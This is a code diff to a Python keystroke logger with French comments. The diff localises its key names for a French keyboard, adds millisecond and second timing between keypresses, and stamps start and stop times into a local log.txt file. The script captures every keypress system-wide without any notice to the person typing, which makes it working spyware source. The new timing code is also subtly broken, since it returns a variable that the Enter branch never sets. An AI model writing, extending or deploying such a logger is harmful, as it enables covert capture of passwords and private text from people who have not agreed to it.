@@ -9,16 +9,17 @@ KEY_MAP = {
     "esc": " [ESC] ",
     "ctrl": " [CTRL] ",
     "alt": " [ALT] ",
+    "alt gr":"[ALT GR]",
     "tab": " [TAB] ",
     "maj": " [MAJ] ",
     "backspace": " [BACKSPACE] ",
-    "caps lock": " [CAPS LOCK] ",
-    "up": " [UP] ",
-    "down": " [DOWN] ",
-    "left": " [LEFT] ",
-    "right": " [RIGHT] ",
-    "page up": " [PAGE UP] ",
-    "page down": " [PAGE DOWN] ",
+    "verr.maj": " [VERR. MAJ] ",
+    "haut": " [HAUT] ",
+    "bas": " [BAS] ",
+    "gauche": " [GAUCHE] ",
+    "droite": " [DROITE] ",
+    "pg.suiv": " [PAGE UP] ",
+    "pg.prec": " [PAGE DOWN] ",
     "home": " [HOME] ",
     "end": " [END] ",
     "insert": " [INSERT] ",
@@ -44,16 +45,24 @@ MAX_FILE_SIZE = 6000
 NUM_LINES_TO_KEEP = 1000
 
 # function to write keyboard inputs to file
-# function to write keyboard inputs to file
-def write_keys(keys_pressed):
+def write_keys(keys_pressed, last_time):
     with open("log.txt", "a") as f:
         if " [ENTER] " in keys_pressed:
-            f.write("\n")
+            f.write("[ENTER] \n")
         else:
-            f.write("".join(keys_pressed))
+            current_time = datetime.datetime.now()
+            time_diff = (current_time - last_time).total_seconds()
+            if time_diff >= 0.5:
+                if time_diff < 2:
+                    f.write(f"[{int(time_diff * 1000)} ms] {''.join(keys_pressed)}")
+                else:
+                    f.write(f"[{int(time_diff)} s] {''.join(keys_pressed)}")
+            else:
+                f.write(''.join(keys_pressed))
+        return current_time
 
 
-# Nettoie le fichier log si il dépasse 6Ko ou qu'il dépasse 1000 lignes
+# function to clean log file
 def clean_file():
     with open("log.txt", "r+") as f:
         lines = f.readlines()
@@ -70,7 +79,8 @@ def on_press(event):
             keys_pressed.append(KEY_MAP[event.name])
         elif event.name.isprintable():
             keys_pressed.append(event.name)
-        write_keys(keys_pressed)
+        global last_time
+        last_time = write_keys(keys_pressed, last_time)
         if os.path.getsize("log.txt") > MAX_FILE_SIZE:
             clean_file()
     except Exception as e:
@@ -80,11 +90,14 @@ def on_press(event):
 def on_exit():
     # write end time to file
     with open("log.txt", "a") as f:
-        f.write(f"Arrêt du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
+        f.write(f"\n Arrêt du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
 
 # write start time to file
 with open("log.txt", "a") as f:
-    f.write(f"Lancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
+    f.write(f"\n Lancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
+
+# initialize last_time
+last_time = datetime.datetime.now()
 
 # start listening for keyboard events
 keyboard.on_press(on_press)
